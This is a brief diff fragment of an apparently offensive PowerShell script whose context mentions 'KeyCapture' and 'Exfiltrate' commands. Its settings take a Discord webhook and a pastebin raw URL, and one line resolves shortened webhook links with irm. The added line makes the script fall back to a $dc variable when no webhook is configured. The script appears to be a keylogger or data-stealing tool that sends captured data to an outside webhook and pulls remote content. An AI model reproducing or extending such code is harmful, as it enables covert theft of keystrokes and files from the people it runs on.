@@ -33,6 +33,7 @@ Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and re
 # $hookurl = "YOUR_WEBHOOK_URL" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
 # $GHurl = "YOUR_FILE_URL"  # eg. https://pastebin.com/raw/QtCxxxx
 
+if ($hookurl.Ln -eq 0){$hookurl = "$dc"}
 # Shortened webhook detection
 if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
 
